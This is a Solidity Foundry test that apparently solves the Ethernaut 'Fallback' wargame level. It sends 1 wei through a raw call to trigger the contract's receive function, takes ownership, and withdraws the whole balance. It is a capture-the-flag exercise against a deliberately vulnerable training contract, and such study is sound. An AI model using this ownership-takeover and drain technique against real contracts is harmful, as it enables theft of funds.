// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import { Fallback } from "ethernaut/L0.fallback.sol";

contract FallbackCrackerTest is Test {
  Fallback internal fb;

  function setUp() external {
    fb = new Fallback();
  }

  receive() external payable {}

  function testFallbackCracker() external {
    (bool success, ) = address(fb).call{ value: 1 }("");
    require(success);
    fb.withdraw();

    assertEq(fb.owner(), address(this));
    assertEq(address(fb).balance, 0);
  }
}
